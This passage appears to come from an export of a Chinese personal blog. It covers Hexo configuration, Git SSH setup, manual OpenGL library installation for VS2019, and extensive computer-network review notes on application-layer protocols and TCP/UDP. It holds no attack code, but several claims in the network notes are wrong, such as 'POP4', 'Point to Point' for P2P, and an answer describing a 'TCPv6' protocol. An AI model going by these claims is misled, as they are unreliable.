:lang\t\t\t\t# 国际化（i18n）文件夹\nskip_render:\t\t\t\t# 跳过指定文件的渲染。详见参考\n```\n\n> 一般无需修改\n\n#### 文章 - Writing\n\n```\n# Writing\nnew_post_name: :title.md\t# 新文章的文件名称\ndefault_layout: post\t\t# 预设布局\ntitlecase: false\t\t\t# 把标题转换为 title case\nexternal_link:\n  enable: true\t\t\t\t# 在新标签中打开链接\n  field: site\t\t\t\t# 作用域，网站/文章 (site / post)\n  exclude: ''\t\t\t\t# 需要排除的域名。主域名和子域名如 www 需分别配置\nfilename_case: 0\t\t\t# 把文件名称转换为 (1) 小写或 (2) 大写 (0 = 不转换) \nrender_drafts: false\t\t# 显示草稿\npost_asset_folder: false\t# 启动 Asset 文件夹\nrelative_link: false\t\t# 把链接改为与根目录的相对位址\nfuture: true\t\t\t\t# 显示未来的文章\nhighlight:\t\t\t\t\t# 代码块的设置, 请参考 Highlight.js 进行设置\t\n  enable: true\n  line_number: true\n  auto_detect: false\n  tab_replace: ''\n  wrap: true\n  hljs: false\nprismjs:\t\t\t\t\t# 代码块的设置, 请参考 PrismJS 进行设置\n  enable: false\n  preprocess: true\n  line_number: true\n  tab_replace: ''\n```\n\n> **[Highlight.js](https://hexo.io/docs/syntax-highlight#Highlight-js)**\n>\n> **[PrismJS](https://hexo.io/docs/syntax-highlight#PrismJS)**\n\n#### 首页设置 - Home page setting\n\n```\n# Home page setting\n# per_page: Posts displayed per page. (0 = disable pagination)\n# order_by: Posts order. (Order by date descending by default)\nindex_generator:\n  path: ''\t\t\t\t\t# 首页的根目录。默认为''\n  per_page: 10\t\t\t\t# 每页显示文章的数量。默认为 10 (0 = 关闭分页功能)\n  order_by: -date\t\t\t# 显示文章的顺序。默认为 -date (date 是按日期升序排序)\n```\n\n#### 分类 & 标签 - Category & Tag\n\n```\n# Category & Tag\ndefault_category: uncategorized\t\t# 默认分类\ncategory_map:\t\t\t\t\t\t# 分类别名\ntag_map:\t\t\t\t\t\t\t# 标签别名\n```\n\n#### 日期 / 时间格式 - Date / Time format\n\n```\n# Date / Time format\n## Hexo uses Moment.js to parse and display date\n## You can customize the date format as defined in\n## http://momentjs.com/docs/#/displaying/format/\ndate_format: YYYY-MM-DD\t\t\t# 日期格式\ntime_format: HH:mm:ss\t\t\t# 时间格式\n## updated_option supports 'mtime', 'date', 'empty'\nupdated_option: 'mtime'\t\t\t# 当 Front Matter 中没有指定 updated 时 updated 的取值\n```\n\n#### 分页 - Pagination\n\n```\n# Pagination\n## Set per_page to 0 to disable pagination\nper_page: 10\t\t\t\t\t# 每页显示的文章量 (0 = 关闭分页功能)\npagination_dir: page\t\t\t# 分页目录\n```\n\n#### 扩展 - Extensions\n\n```\n# Extensions\n## Plugins: https://hexo.io/plugins/\n## Themes: https://hexo.io/themes/\ntheme: landscape\t\t\t\t# 当前主题名称。值为 false 时禁用主题\n```\n\n#### 部署 - Deployment\n\n```\n# Deployment\n## Docs: https://hexo.io/docs/one-command-deployment\ndeploy:\n  type: git\t\t\t\t\t\t# 部署方式\n  repo: \t\t\t\t\t\t# 库（Repository）地址，SSH比较好\n  branch: \t\t\t\t\t\t# 可选，分支名称（Github默认为master）\n  message: \t\t\t\t\t\t# 自定义提交信息（默认为Site updated: \n```\n","tags":["hexo"],"categories":["hexo"]},{"title":"Git的绑定与连接","url":"/2023/10/29/Git的绑定与连接/","content":"\n# Git的绑定与连接\n\n<!-- toc -->\n\n## 配置Git的User\n\n打开Git Bash（或命令行）\n\n配置全局name：\n\n* github用户名\n\n  ```bash\n  git config --global user.name name\n  ```\n\n配置全局email：\n\n* github邮箱：\n\n  ```bash\n  git config --global user.email email\n  ```\n\n以我自己的github账户为例：\n\n```bash\ngit config --global user.name t3uk1\ngit config --global user.email xxx@qq.com\n```\n\n\n\n## 使用SSH方式远程连接Git\n\n打开Git Bash（或命令行）\n\n在本地生成对应邮箱的**SSH RSA公钥密钥**\n\n```bash\nssh-keygen -t rsa\n```\n\n使用**默认生成路径**，**默认空key**，这样就可以无需认证直接连接，如果想要设置秘钥也可以设置。\n\n前往 `~/.ssh` 目录下寻找密钥（其中默认**`id_rsa`**是密钥信息，**`id_rsa.pub`**为公钥信息）\n\n在 **Github** 中新建 **SSH keys**：\n\ngithub→ Settings→SSH and GPG keys→右上角new SSH key， 打开界面如下：\n\n![新增SSH](Git的绑定与连接/image-20231029205623302.png)\n\n其中*Title*可以随意填，*Key*中内容填的是前面生成的(**id_rsa.pub**)的文件内容即公钥信息。\n\n创建完成后，运行下面的指令，若出现下图情况则说明成功。\n\n```bash\nssh git@github.com\n```\n\n![success](Git的绑定与连接/image-20231029205914245.png)\n","tags":["github","SSH连接"],"categories":["Git"]},{"title":"OpenGL环境手动安装配置记录","url":"/2023/10/29/图形学/","content":"\n# OpenGL环境手动安装配置记录\n\n<!-- toc -->\n\n~~由于一键安装时vcpkg的傻逼报错修了一晚上修不好于是综合了好几个安装教程博客手动添加库才成功跑起来~~\n\n### 1、安装VS2019\n\n这个直接略过\n\n### 2、安装cmake\n\nhttps://cmake.org/download/\n\n在上述网址下载对应平台安装包即可，注意在安装时关于修改系统环境变量的选项中选择添加到所有用户的PATH\n\n### 3、安装Git\n\n这个装过了，安装直接搜索网络教程就行。\n\n### 4、安装OpenGL库与在VS2019的配置\n\n###### GLFW\n\nhttps://www.glfw.org/download.html\n\nwindows端选择pre-compiled binaries，这是已经预编译的文件，可以直接使用\n\n![glfw下载](图形学/image-20230912105714270-16985808329371.png)\n\n将下载好的文件解压，将对应文件拷贝到vs2019安装目录中的文件夹中，本机的安装目录如下，根据自己的安装情况找到对应文件夹\n\n<img src=\"图形学/image-20230912105914220-16985808329372.png\" alt=\"vs安装目录\" style=\"zoom: 67%;\" />\n\n头文件：在下载好的GLFW文件夹中，将头文件拷贝到vs目录中的include目录中的GL文件夹，若没有则先创建一个GL文件夹，这个文件夹用于专门存储OpenGL库的头文件。\n\nbin文件：将对应dll文件拷贝到vs目录下的bin文件夹中，拷贝到最小目录，注意将x86文件拷贝到x86目录下，x64文件拷贝到x64目录下。\n\n.lib文件：与bin同理，拷贝到lib目录下的文件夹中，注意x86和x64都要拷贝。\n\n\n\n###### GLEW\n\nhttps://glew.sourceforge.net/\n\n下载最新版本即可，相关配置同上\n\n\n\n###### FreeGLUT\n\nhttps://www.transmissionzero.co.uk/software/freeglut-devel/\n\n\n\n###### glad\n\nhttps://glad.dav1d.de/\n\nAPI gl version直接选4.6即可，将include部分直接拷贝到vs头文件GL目录下\n\n![glad下载](图形学/image-20230912111603093-16985808329383.png)\n\n\n\n###### glm\n\nhttps://github.com/g-truc/glm/releases/tag/0.9.8.0\n\n解压后把子文件夹中的glm文件夹直接整个拷贝到vs目录中的include中，导入头文件的方式为：\n\n```c\n#include<glm/glm.hpp>\n```\n\n\n\n\n\n###### vs中配置\n\n在目标目录新建一个项目\n\n进入vs2019，点击项目，管理NuGet程序包，搜索nupengl，安装两个相关的组件\n\n链接配置：运行前，将几个dll文件拷贝到系统文件夹（C:\\Windows\\SysWOW64   C:\\Windows\\System32）\n\n右键项目，点进属性->连接器->输入->附加依赖项\n\n![vs2019中对项目添加依赖项](图形学/image-20230912112352987-16985808329384.png)\n\n将 freeglut.lib;glew32.lib;glfw3.lib;OpenGL32.lib;复制到附加依赖项中。\n\n* Debug时可以正常运行但Release模式无法正常执行？\n\n  在项目设置中配置为Release的菜单中再导入一次上面的依赖项即可\n\n***注意一定要执行上面的操作，否则会报无法解析外部符号的错误***\n\n保存设置，基本配置就差不多了，使用的时候只需导入对应头文件即可。\n\n\n\n注意：\n\n* 导入glad的时候只导入头文件运行的话会出现未识别的外部符号问题，因此要将glad.c文件导入到项目中。\n\n* 若出现 #error : OpenGL header already included,remove this include, glad already provides it报错，将glad头文件的导入放在其他所有OpenGL库导入的前面即可解决。\n","tags":["openGL"],"categories":["计算机图形学"]},{"title":"计算机网络复习笔记","url":"/2023/07/21/计算机网络复习笔记/","content":"\n# 计算机网络复习笔记\n\n当时计网考前复习的时候写的笔记，搬运一下\n\n<!-- toc -->\n\n\n\n## 基础知识\n\n### OSI模型结构：\n\n**物理层--数据链路层--网络层--传输层**--会话层--表示层--**应用层** 七个层次\n\n\n\n## 应用层\n\n### URL\n\nURL：www上网页的网址\n\nURL组成结构：协议名称  |  主机名  |  文件名\n\n例如：<u>https:</u>(协议名称) www.myhost.com（主机名） <u>/index.html</u>（文件名）\n\n\n\n### HTTP协议\n\n* 浏览器与web服务器之间使用的协议\n\nHTTP请求报文：有四个部分构成：请求行，报头，空白行，正文\n\n请求行结构：方法，URL，HTTP版本\n\n常见HTTP请求头的作用：\n\nHTTP应答报文结构：与请求报文结构基本一致，区别在于请求头处变为应答头。\n\n\n\n常见HTTP应答报文代码说明：\n\n200：OK，请求成功\n\n202：Accepted，请求被接受但还没有马上起作用\n\n403：Forbidden，服务被拒绝\n\n404：Not Found，文档未发现\n\n<img src=\"计算机网络复习笔记/image-20230627204249016.png\" alt=\"image-20230627204249016\" style=\"zoom: 67%;\" />\n\n\n\n### 电子邮件协议\n\n电子邮件客户端发送邮件：SMTP\n\n接收邮件常用协议：POP4 或 IMAP   （POP3）\n\n基于Web的电子邮件用户与远程邮箱之间的通信**使用的是HTTP协议**，而不是POP3或IMAP4协议\n\n\n\n### TELNET（交互式会话）协议\n\nTELNET是一种远程登录协议，用于在网络上远程操作计算机系统。TELNET协议**基于TCP/IP协议**，它允许用户通过TCP/IP网络连接到远程主机（支持远程登录应用），以便在远程主机上执行命令和程序，就像直接在本地计算机上一样。\n\n\n\n### 非持续连接与持续连接\n\n* **非持续连接：在只有接收到前一个请求的响应的时候才会发送新的请求。**在非持久连接中，每个HTTP请求/响应交换都需要建立一个新的TCP连接。当客户端向服务器发送HTTP请求时，它会建立一个TCP连接并发送一个HTTP请求报文，服务器收到请求后会发送一个HTTP响应报文，并关闭TCP连接。如果客户端需要发送另一个HTTP请求，它需要再次建立一个新的TCP连接，然后发送第二个HTTP请求报文，以此类推。\n\n  在非持续链接的http文件传输中，每一个文件的传输之前都要进行握手验证。\n\n* **持续连接：客户端在没有收到前一个响应的时候就发出新的请求（流水线）。**在持久连接（persistent connection）中，一个TCP连接可以用于传输多个HTTP请求和响应，而不需要每次都建立新的TCP连接。在持久连接中，多个HTTP请求和响应可以使用同一个TCP连接进行传输，从而减少了TCP连接的建立和关闭次数，提高了网络传输的效率。\n\n  在持续连接过程中，除了第一次传输之前要进行握手，后面的文件传输无需握手。\n\n\n\n### 工作模式\n\n* C/S： Client-Server\n\n  例如：Web应用程序、邮件客户端、FTP、数据库管理系统等\n\n  采用C/S模式原因：**网络资源分布的不均匀性**\n\n* P2P：Point to Point\n\n  例如：BitTorrent\n\n  * P2P网络并不是一个新的网络结构，而是一种新的网络应用模式\n\n\n\n### FTP\n\n文件传输协议\n\nFTP基于TCP协议\n\nFTP连接中，客户端端口号为临时端口号，服务器端口号为固定端口号，其中控制连接端口号为21，数据连接端口号为20.\n\n**FTP**的特点\n\n* **交互式用户界面**：利用FTP命令方便与服务器对话\n\n* **对文件格式说明**：允许指定数据类型和格式（文本方式、二进制方式）\n\n* **权限控制**：文件传输之前，向服务器提供登录用户名和口令\n\n\n\n### TFTP\n\nTFTP基于UDP协议\n\n**TFTP**的特点\n\n* 传输可靠性：FTP面向连接的可靠传输，采用**TCP**；TFTP**简洁**、采用**UDP**\n\n* 协议命令集：FTP包含发送/接收文件、**列出目录与删除文件**等**复杂命令**，TFTP协议**只定义文件发送**/**接收**基本命令\n\n* 数据表示：FTP可**指定数据类型**，TFTP只允许传输**ASCII**码或二进制文本文件\n\n* 用户鉴别：FTP有登录用户鉴别功能，TFTP**不提供用户鉴别**功能\n\n\n\n### DNS\n\n* DNS基于**UDP协议**，使用无连接服务\n\nDNS的作用\n\n* **主机域名转换成IP地址**\n\n* 能够方便访问各种网络资源和服务\n\n* 实现互联网应用层协议的基础\n\n\n\n#### DNS域名解析模式\n\n* 迭代解析：\n\n  <img src=\"计算机网络复习笔记/image-20230627210014763.png\" alt=\"image-20230627210014763\" style=\"zoom:67%;\" />\n\n* 递归解析\n\n  <img src=\"计算机网络复习笔记/image-20230627210033495.png\" alt=\"image-20230627210033495\" style=\"zoom:67%;\" />\n\n* 高速缓存解析\n\n\n\n### 其他\n\n网络协议相关：\n\n* 网络协议三要素：语法、语义、同步\n\n* 协议是控制两个对等实体之间的通信规则集合\n\n* 协议规定了对等层实体之间所交换的信息的格式和含义\n\n  \n\nTFTP协议：基于**UDP协议**实现，常用于在局域网内进行小文件传输。TFTP协议的主要目的是提供一种简单的文件传输机制，以支持网络启动、配置文件传输、固件更新等应用场景。\n\n\n\n## 传输层\n\n* 根本目的：在网络层提供的数据通信服务基础上，实现主机**进程间可靠**服务，实现“**端到端**”服务（主机-主机 → 端-端）\n\n* 两大功能：\n  * 加强、弥补网络层提供的网络服务\n  * 进一步提供进程间“可靠”通信机制\n\n* 关键属性：传输层协议软件属于OS内核软件而非用户软件！\n\n传输层与应用层之间的关系：**传输层提供应用进程间的逻辑通信**\n\n#### 应用进程、传输层接口与套接字\n\n* 传输层协议在本地主机操作系统控制下，为应用程序提供确定的服务\n\n* 网络层解决IP地址，传输层解决**进程标识**\n\n* **套接字**：建立网络应用程序的可编程接口（应用编程接口API）\n\n#### 应用进程标识的基本方法：\n\n* 传输层**进程寻址**：通过TCP/UDP**端口号**实现\n\n* **套接字**：IP地址+端口号，比如：202.1.2.5:80\n\n* 进程标识**三元组**：协议、本地地址、本地端口，也叫半相关\n  * 比如：TCP, 202.1.2.5:3022\n\n* 进程通信标识**五元组**：协议、本地地址、本地端口、远程地址、远程端口号，也叫全相关<img src=\"计算机网络复习笔记/image-20230417090326746.png\" alt=\"image-20230417090326746\" style=\"zoom:67%;\" />\n\n#### 端口号的分配方法：\n\n* **熟知端口号**：给每种**服务器**分配的确定的全局端口号，也叫公认端口号，范围在0~1023，统一分配与控制\n\n  *一般来说，客户端进程不建议采用熟知端口号范围内的端口*\n\n* **注册端口号**：在IANA注册的端口号，没有明确的定义服务对象，不同程序可根据实际需要自己定义，范围在1024~49152\n\n* **临时端口号**：**客户端**程序使用的临时端口号，由客户端上TCP/IP软件随机选取，范围在49152~65535\n\n* 常用熟知端口号：\n\n  <img src=\"计算机网络复习笔记/image-20230417090653023.png\" alt=\"image-20230417090653023\" style=\"zoom:50%;\" />\n\n\n\n### TCP协议与UDP协议\n\n两种协议的比较：\n\n| 特征/描述          | **TCP**                                            | **UDP**                                                      |\n| :----------------- | -------------------------------------------------- | ------------------------------------------------------------ |\n| 一般描述           | 允许应用程序**可靠**地发送数据，**功能齐全**       | **简单**、**高速**，**只**负责将应用层与网络层衔接起来       |\n| 面向连接与无连接   | **面向连接**，在TPDU传输之前需要建立TCP连接        | **无连接**，在TPDU传输之前不需要建立UDP连接                  |\n| 与应用层的数据接口 | **基于字节流**，应用层不需要规定特点的数据格式     | **基于报文**，应用层需要将数据分成包来传送                   |\n| 可靠性与确认       | **可靠**报文传输，对所有的数据均要确认             | **不可靠**，不需要对传输的数据确认，尽力而为地交付           |\n| 重传               | **自动重传**丢失的数据                             | **不负责检查**是否丢失数据和重传                             |\n| 开销               | **低**，但高于UDP                                  | **很低**                                                     |\n| 传输速率           | **高**，但低于UDP                                  | **很高**                                                     |\n| 适用的数据量       | 从少量到几个GB的数据                               | 从少量到几百个字节的数据                                     |\n| 适用的应用类型     | 对数据传输可靠性要求较高的应用，例如文件与报文传输 | 发送数量比较少，对数据传输可靠性要求低的应用，例如IP电话、视频会议、多播与广播 |\n\n\n\n### UDP协议\n\n主要特点：\n\n* **无连接、不可靠**：开销低、尽力而为  *存在数据包丢失、重复、顺序错乱等问题。*\n\n* **面向报文**的传输层协议：UDP 对应用层传递下来的报文，既不合并，也不拆分，而是保留这些报文的边界。UDP 层<u>一次向对方交付一个完整的报文</u>\n\n* **没有拥塞控制**：网络出现的拥塞时，UDP不会使源主机的发送速率降低，适合实时通信应用\n\n* **首部开销小**：只有8字节\n\n适用范围：\n\n* **对性能的要求高于对数据完整性的要求**\n\n  如： 视频播放实时交付的要求高于对数据交付可靠性要求（**可丢失个别数据包**）\n\n* 需要“**简短快捷**”的数据交换\n\n  简单的请求与应答报文交互\n\n* 需要**多播和广播**的应用\n\n  源主机以恒定速率发送报文，拥塞发生时<u>允许丢弃</u>部分报文\n\n#### UDP数据报格式\n\n<img src=\"计算机网络复习笔记/image-20230417091331199.png\" alt=\"image-20230417091331199\" style=\"zoom:67%;\" />\n\n* **端口号：**包括源端口号和目的端口号，分别表示发送方和接收方的进程端口号，各为2字节\n\n* **UDP总长度**：包括报头在内的用户数据报的总长度，2字节\n\n* **校验和：**用于检查整个数据报（含报头）是否传输出错，可选，若无，填0\n\n  校验和计算：伪报头+UDP数据报\n\n  伪报头：验证UDP数据报是否正确传送到目的进程\n\n  ![image-20230417091543680](计算机网络复习笔记/image-20230417091543680.png)\n\n  ```algorithm\n  UDP checksum算法：\n  UDP校验和是用来检测数据报文在传输过程中是否发生错误的一种方法。它是对数据报文中的所有字段，以及一些来自IP报头的字段，进行一种特殊的加法运算得到的一个16位的值。这些字段构成了一个伪首部，用于进行校验和计算。\n  \n  校验和计算的步骤如下：\n  \n  - 将数据报文中的所有字段，以及伪首部中的字段，按照16位为一组，进行二进制求和。\n  - 如果最后有不足16位的部分，就在其后面补0，使其成为16位。\n  - 如果求和过程中出现溢出，就将溢出的部分加到最低位上。\n  - 将求和得到的结果取反码，即将所有的0变为1，所有的1变为0。这就是校验和。\n  - 将校验和放入数据报文的校验和字段中，发送给接收方。\n  \n  接收方收到数据报文后，也要进行校验和计算。它将数据报文中的所有字段，以及伪首部中的字段，按照同样的方法进行二进制求和，并取反码。然后，它将这个结果与数据报文中的校验和字段进行比较。如果相等，就说明没有发生错误。如果不相等，就说明发生了错误。\n  ```\n\n* 思考题：UDP协议要求一个UDP数据报的数据字段长度必须是16位比特的整数倍，不足补0。为什么？\n\n  UDP数据报的数据字段长度必须是16位比特的整数倍，是因为UDP报文头中有一个16位的字段表示UDP总长度，这个字段包括了UDP报头和数据区的长度，而UDP报头的长度是固定的8字节，所以数据区的长度必须是8字节的整数倍，也就是16位比特的整数倍。如果数据区的长度不足，就需要在后面补0，以保证UDP总长度字段的正确性。\n\n\n\n\n### TCP协议\n\n特点及应用：\n\n* 支持**面向连接**的服务：打电话式、会话式通信\n\n* 支持**字节流**传输：字节管道、字节按序传输和到达\n\n* 支持**全双工**服务：一个应用进程可以<u>同时收发数据、捎带确认</u>\n\n* 支持建立多个**并发的**TCP连接（服务器同时响应多个连接）\n\n* 支持**可靠**传输服务：不丢失、不重复、有序\n\n\n\n##### TCP报文格式\n\n![image-20230417092409698](计算机网络复习笔记/image-20230417092409698.png)\n\n* 源端口号：TCP报文发送方的端口号，占16 bit，所能表示的序号范围是：0~(216-1)\n* 目的端口号：TCP报文接收方的端口号，占16 bit，所能表示的序号范围是：0~(216-1)\n* 发送序号(seq)：表示TCP**数据字段**的第一个**字节**的序号\n  * 连接建立时（即SYN=1），初始序号（ISN）由随机数生成器生成，发送端和接收端**独立产生**，可能不一样\n  * 占32 bit，所能表示的序号范围是：0~(232-1)\n* 确认序号(ack)：只有当**ACK**位=1时有效，表示发送此报文段的进程**期望接收的**下一个新字节的序号。\n  * 确认序号=N+1，表示接收方已经成功接收了序号为N及之前的所有字节，要求发送方接下来应该发送起始序号为N+1的字节段。\n  * 注意区分**ack**与**ACK**（ack为确认序号，ACK为确认位）\n* **窗口值**：指示当前进程**可以接收的**数据长度 (单位: 字节)。\n  * 准备接收下一个TCP报文的接收方，通知即将发送报文的发送方下一个报文中最多可以发送的字节数，是发送方确定**发送窗口**的依据，是**动态可变**的。\n* 报头长度：TCP报文**首部**的大小，单位是**4字节**\n  * *思考：TCP和UDP报头中的长度字段有什么不同？该字段的取值范围是[5,15]，为什么?*\n    * *TCP报头中的长度字段表示TCP报头的长度，单位为32位字，占4位，最小值为5，最大值为15。UDP报头中的长度字段表示UDP数据报的总长度（包括报头和数据），单位为字节，占16位，最小值为8，最大值为65535。*\n    * *TCP报头中的<u>长度字段是可变的，因为TCP报头有可选部分</u>。UDP报头中的长度字段是固定的，因为UDP报头没有可选部分。*\n* 校验和：\n  * 与UDP校验和的**相同点**：1）计算方式相同；2）也需要伪首部。\n  * 与UDP校验和的**不同点**：1）UDP校验和可选，<u>TCP校验和必须</u>；2）伪首部协议字段值为6。\n\n\n\n##### TCP报文标志位的含义\n\n<img src=\"计算机网络复习笔记/image-20230417093336455.png\" alt=\"image-20230417093336455\" style=\"zoom:67%;\" />\n\n\n\n**TCP最大段长度（MSS）**：TCP报文**数据部分**的最大长度，**不包括TCP报头长度**。默认值为536字节\n\nMSS与窗口长度的区别：\n\n- MSS是最大报文段长度，表示TCP报文段中数据部分的最大长度，单位为字节。窗口长度是TCP滑动窗口的大小，表示接收方能够接收的数据量，单位为字节。\n- **MSS是一个静态的值**，只出现在TCP连接建立时的SYN报文段中，由发送方和接收方协商确定。**窗口长度是一个动态的值**，随着数据的发送和接收而变化，由接收方根据自身的缓存空间和网络状况来通知发送方。\n\nMSS大小选择：1) 考虑协议开销，不能太小；2) 考虑分段导致的网络层开销和传输出错概率，不能太大；3) 考虑发送和接收缓冲区的限制\n\n\n\n思考题：\n\n1.TCP报文段为什么没有字段定义数据字段的长度？这样做会有什么潜在的问题？\n\n```\n- 原因：TCP报文段是基于IP协议传输的，IP首部中已经有了整个数据报的总长度字段，而TCP首部中也有了TCP首部的长度字段，因此可以通过减法得到数据字段的长度。另外，TCP提供的是面向字节流的传输，所传输的数据是无边界的，不需要定义数据字段的长度。\n- 潜在的问题：TCP报文段没有字段定义数据字段的长度可能会导致一些安全问题，比如攻击者可以利用TCP首部中的可选项字段来插入恶意代码或数据，从而篡改或破坏正常的数据传输。另外，TCP报文段没有字段定义数据字段的长度也可能会影响传输效率，比如如果TCP首部中的可选项字段过长，会占用更多的带宽和缓存空间。\n```\n\n2. TCPv6的数据结构与TCPv4的数据结构有何不同？\n\n```\nTCPv6和TCPv4的数据结构基本上是一样的，都是由源端口、目的端口、序号、确认号、数据偏移、保留位、控制位、窗口大小、校验和、紧急指针和选项字段组成的。不过，TCPv6是在IPv6的网络层上运行的，而TCPv4是在IPv4的网络层上运行的。IPv6和IPv4的主要区别是地址长度，IPv6有128位，而IPv4只有32位。这意味着IPv6可以提供更多的地址空间，更好的安全性和更高的效率。\n```\n\n\n\n#### TCP通信过程\n\n三个阶段：建立连接——数据双向传输——释放连接\n\n* 建立连接阶段：\n\n  三个报文段交互，三次握手\n\n  1、**客户端**：发送连接建立请求，SYN=1，==ACK=0==，Seq=x。SYN=1的报文段不携带数据，但要消耗掉一个序号。\n\n  2、**服务器端**：收到请求并同意，SYN=1，==ACK=1==，Seq=y, ack=x+1（回复的ack为接收的seq+1）。该报文段也是SYN=1的报文段，不携带数据，但要消耗掉一个序号\n\n  3、**客户端**：收到服务器的确认，并对此进行确认。ACK=1, **Seq=x+1, ack=y+1**\n\n* 释放连接阶段：\n\n  <img src=\"计算机网络复习笔记/image-20230514094718467.png\" alt=\"image-20230514094718467\" style=\"zoom: 50%;\" />\n\n  * 两个方向的连接，可以间隔开来释放\n  * 每个方向的连接释放，需要2个报文段\n\n  其中，图中的MSL为<u>最大报文生存时间（Maximum Segment Lifetime）</u>，是任何报文段被丢弃前在网络内的最长时间。\n\n  思考：需要等待2MSL的原因\n\n  ```\n  TCP通讯释放连接时需要等待2MSL的原因是为了保证网络中所有的数据包都被接收方接收完毕，防止这些数据包在网络中滞留，导致新的连接误认为这些数据包是自己的数据包，从而出现错误。2MSL即两倍的MSL，TCP的TIME_WAIT状态也称为2MSL等待状态。当TCP的一端发起主动关闭，在发出最后一个ACK包后，即第3次握手完成后发送了第四次握手的ACK包后就进入了TIME_WAIT状态，必须在此状态上停留两倍的MSL时间，等待2MSL时间主要目的是怕最后一个ACK包对方没收到，那么对方在超时后将重发第三次握手的FIN包，主动关闭端接到重发的FIN包后可以再发一个ACK应答包。\n  ```\n\n  假如客户端建立了到服务器的连接，传输了一些数据，但是突发故障崩溃。此种情况下，服务器将处于一种什么状态？\n\n  ```\n  服务器此时应处于等待应答状态，为了避免客户端崩溃占用服务器资源，服务器设置保持定时器来检验客户端的连接状态。\n  保持定时器（服务器端）：每次收到客户端发来的消息就复位；定时器设定为2小时，超时则发送探测包。连续十个探测包还没收到回应，则中断连接。\n  ```\n\n  客户端最终进入的TIME-WAIT状态该如何实现？\n\n  ```\n  使用时间等待定时器（客户端）：设定为报文寿命的2倍\n  ```\n\n\n\n* **TCP通过三次握手建立连接，通过四次握手释放连接**\n\n\n\n思考1：TCP通讯为什么要用三次握手，一次，两次，四次行不行？\n\n```\n一次握手显然不可行，因为没有收到对方的任何回复，无法确定对方是否同意建立连接并进行通信。\n四次握手肯定可以，但是相比于三次握手，没有增加任何必要的信息，浪费了信道资源，没有必要。\n两次握手不可行的原因：\n（1）客户端和服务器无法通过两次握手确认彼此的收发功能是否正常\n（2）客户端与服务器之间的序列号无法同步，也就是服务器返回的确认可能会丢失，导致客户端无法知道服务器的起始序列号，自然无法保证可靠性\n（3）防止已失效的连接请求报文段突然又传送到了服务器端\n```\n\n思考2：什么是SYN攻击？\n\n```\nSYN攻击也叫SYN洪泛（SYN Flood），是指攻击者发送大量的SYN包给服务器，但是并不回复ACK包，导致连接处于“半打开” 状况，消耗了服务器大量的资源。当合法用户发送SYN包请求建立连接时，服务器由于资源被占用而拒绝与其连接并提供服务。因此，SYN攻击属于拒绝服务攻击（Denial-of-service attack）\n应对措施主要包括：过滤（Filtering）、增加积压（Increasing Backlog）、减少SYN-RECEIVED定时（Reducing SYN-RECEIVED Timer）、SYN缓存（SYN Cache）等\n```\n\n思考3：初始序列号为什么每次都要动态随机选取而不能固定不变？\n\n```\nTCP通讯初始序列号需要动态随机选取，主要是为了保证网络安全。TCP在开始传输数据前，客户端和服务器需要随机生成自己的初始序列号（initial sequence number-ISN），然后通过三次握手进行交换确认。这样做的目的是为了防止网络中的攻击者通过猜测序列号来伪造数据包，从而达到攻击的目的。如果序列号是固定的，那么攻击者可以通过猜测序列号来伪造数据包，从而达到攻击的目的。\n```\n\n**思考4：1.对于数据字段长度=0的SYN/FIN报文段S，假定S的序号为x，为什么其ACK报文段的序号等于x+1？**\n\n```\nTCP协议中，对于数据字段长度为0的SYN/FIN报文段S，假定S的序号为x，其ACK报文段的序号等于x+1。这是因为SYN/FIN报文段不携带数据，但是需要占用一个序号。因此，当SYN/FIN报文段的序号为x时，其ACK报文段的序号应该为x+1。\n```\n\n\n\n\n\n总结：\n\n* 以==滑动窗口==中的多个报文段为单位的双向传输（数据传输阶段）\n\n* 应用进程将数据以==字节流==发送，无需考虑发送数据字节长度，由TCP负责将字节流分段 打包\n\n* 借助滑动窗口，实现==按序的，无差错、不丢失、不重复==传送字节流\n\n* 提供==差错控制==功能，保证正确接收字节流（通过差错检测、确认、重传实现）\n\n\n\n### 传输控制协议\n\n#### TCP的滑动窗口与确认重传机制\n\n<img src=\"计算机网络复习笔记/image-20230514092918468.png\" alt=\"image-20230514092918468\" style=\"zoom: 80%;\" />\n\n字节流**分段**，按**段**（序号）传输，捎带确认（确认号）\n\n通过滑动窗口跟踪、记录发送状态，实现差错控制\n\n\n\n两个缓存，两个窗口：\n\n* 发送方缓存：用于存储准备发送的数据\n\n* 发送窗口：窗口值**不为0**，可以发送报文段\n\n* 接收方缓存：将正确接收的字节流写入缓存，等待接收读取\n\n* 接收窗口：窗口值**等于接收缓存可以接收**的字节流\n\n发送方使用发送缓存和发送窗口，接收方使用接收缓存和接收窗口，发送方窗口大小大于接收方窗口大小时，发送方需等待接收方确认完毕后才能继续发送数据。\n\n![image-20230514101054609](计算机网络复习笔记/image-20230514101054609.png)\n\n注意：已经发送的数据要等接收方确认后发送窗口才能进行滑动\n\n![image-20230514101221157](计算机网络复习笔记/image-20230514101221157.png)\n\n\n\n![image-20230514101322640](计算机网络复习笔记/image-20230514101322640.png)\n\n假定进程A与B建立了一个TCP连接，A向B发送了一个报文段，覆盖字节编号**[1,6]**。A 收到了 B 发来的ACK报文段，其中**确认号**是**4**，**窗口大小**是**6**字节。\n\n则**B的接收窗口的一种可能形式：**\n\n<img src=\"计算机网络复习笔记/image-20230514101351220.png\" alt=\"image-20230514101351220\" style=\"zoom:50%;\" />\n\n对上图的说明：\n\n1）B期望接收的字节在范围[4,9]之内\n\n2）若收到的字节的序号<=3，则是**重复**的数据，**丢弃**\n\n3）若收到的字节的序号>=10，则是**跳序**的数据，**丢弃**\n\n4）只有当收到的字节序号距离RCV.NXT指针是**连续的**(如收到序号为4,5的两个字节)，接收窗口才会向右滑动(如RCV.NXT += 2)\n\n5）TCP支持SACK选项，即可以对[4,9]之间的**非连续字节**进行选择确认。如收到序号4,5,7,8的四个字节，B向A发送ACK报文段，其中确认号是**6**，TCP选项为[7,8]，表示序号7到8之间的字节被收到。 \n\n总结：对于接收窗口，重复收到的数据（已经确认）和跳序数据（超出接收窗口范围）直接丢弃，只有收到字节序号在接受窗口范围内切连续，接收窗口才会向右滑动，同时支持非连续字节传输，利用SACK补全缺失的序号。\n\n\n\n滑动窗口的特点：\n\n* 使用发送和接受缓冲区，以及滑动窗口机制控制TCP连接上的字节传输\n* TCP滑动窗口面向字节流，可以起到**差错控制**和**流量控制**作用\n* 接收方可以在任何时候发送确认，窗口大小可由接收方根据需要增大或减少\n* 发送窗口值**不能超过**接收窗口值，发送方可以根据自身需要来决定\n\n\n\n##### 接收窗口、发送窗口与拥塞窗口的关系\n\n拥塞窗口每次收到一个确认段之后大小对应增加该段的大小\n\n接收窗口大小为分配大小 - 